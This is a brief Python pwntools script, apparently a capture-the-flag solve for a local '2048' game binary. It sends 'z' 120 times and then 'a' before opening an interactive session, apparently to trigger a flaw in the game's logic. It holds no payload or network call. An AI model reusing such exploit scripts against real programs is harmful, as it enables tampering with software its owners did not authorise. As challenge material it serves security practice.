from pwn import *

binary = ELF('./2048')
comm = process(binary.path)

for i in range(120):
  comm.sendline(b'z')

comm.sendline(b'a')
comm.interactive()
